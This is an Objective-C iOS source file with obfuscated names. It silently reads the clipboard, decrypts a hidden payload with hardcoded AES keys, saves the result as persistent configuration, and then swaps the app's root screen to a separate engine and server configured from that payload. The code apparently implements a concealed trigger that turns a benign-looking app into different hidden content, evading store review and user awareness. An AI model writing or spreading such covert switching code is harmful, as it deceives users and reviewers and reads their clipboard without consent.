#import "RNShinyNOVHelper.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <RNShinyNOVUmeng/RNShinyNOVUmeng.h>
#import <RNShinyOCTEngine/RNShinyOCTEngine.h>
#import <RNShinyNOVServer/RNShinyNOVServer.h>
#import <react-native-orientation-locker/Orientation.h>

@interface RNShinyNOVHelper()

@property (strong, nonatomic)  NSArray *butterfly;
@property (strong, nonatomic)  NSArray *adventure;

@end

@implementation RNShinyNOVHelper

static RNShinyNOVHelper *instance = nil;

+ (instancetype)dwater_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.butterfly = @[[NSString stringWithFormat:@"%@%@", @"a71556f65ed2b", @"25b55475b964488334f"],
                           [NSString stringWithFormat:@"%@%@", @"ADD20BFCD9D4E", @"A0278B11AEBB5B83365"]];
    instance.adventure = @[@"dwater_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (BOOL)dwater_elephant {
    NSString *cpString = [self dwater_getHaphazard];
    CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self dwater_subSunshine:cpString]
                                                              hexKey:self.butterfly[0]
                                                               hexIv:self.butterfly[1]];

    NSDictionary *dict = [self dwater_stringWhirlwind:aes.utf8String];
    return [self dwater_storeConfigInfo:dict];
}

- (UIInterfaceOrientationMask)dwater_getOrientation {
    return [Orientation getOrientation];
}

- (NSString *)dwater_getHaphazard {
    return [UIPasteboard generalPasteboard].string ?: @"";
}

- (NSString *)dwater_subSunshine: (NSString* )cpString {
  if ([cpString containsString:@"#iPhone#"]) {
    NSArray *university = [cpString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
        cpString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return cpString;
}

- (NSDictionary *)dwater_stringWhirlwind: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)dwater_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.adventure[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)dwater_tryThisWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.adventure[0]]) {
    return YES;
  } else {
    return [self dwater_elephant];
  }
}

- (UIViewController *)dwater_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [[RNShinyOCTEngine shared] changeRootController:application withOptions:launchOptions];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [RNShinyNOVUmeng configAppKey:[ud stringForKey:self.adventure[1]] andChannel:[ud stringForKey:self.adventure[2]]];
    [[RNShinyNOVServer shared] configNOVServer:[ud stringForKey:self.adventure[5]] withSecu:[ud stringForKey:self.adventure[6]]];
    return vc;
}

@end
